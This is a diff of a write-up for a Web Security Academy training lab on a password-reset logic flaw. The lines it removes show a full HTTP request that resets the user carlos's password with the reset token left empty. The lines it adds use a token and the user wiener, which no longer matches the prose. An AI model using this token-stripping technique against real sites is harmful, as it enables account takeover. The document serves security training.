@@ -168,26 +168,26 @@ we have to manipulate specific parameters in the request or so to test for the b
  In Burp Repeater, observe that the password reset functionality still works even if you delete the token of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password. 
  
  
-    POST /forgot-password?temp-forgot-password-token= HTTP/1.1
-    Host: 0a7700010413bae5c061c30700a60020.web-security-academy.net
-    Cookie: session=r4IcnPAgxzJSVzZN4nq3v5CyaQO39587
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-    Accept-Language: en-US,en;q=0.5
-    Accept-Encoding: gzip, deflate
-    Content-Type: application/x-www-form-urlencoded
-    Content-Length: 83
-    Origin: https://0a7700010413bae5c061c30700a60020.web-security-academy.net
-    Referer: https://0a7700010413bae5c061c30700a60020.web-security-academy.net/forgot-password?temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISC 
-    Upgrade-Insecure-Requests: 1
-    Sec-Fetch-Dest: document
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-User: ?1
-    Te: trailers
-    Connection: close
+    POST /forgot-password?temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu HTTP/1.1
+Host: 0a7700010413bae5c061c30700a60020.web-security-academy.net
+Cookie: session=r4IcnPAgxzJSVzZN4nq3v5CyaQO39587
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 115
+Origin: https://0a7700010413bae5c061c30700a60020.web-security-academy.net
+Referer: https://0a7700010413bae5c061c30700a60020.web-security-academy.net/forgot-password?temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
 
-    temp-forgot-password-token=&username=carlos&new-password-1=khan&new-password-2=khan
+temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu&username=wiener&new-password-1=khan&new-password-2=khan
  
  
  
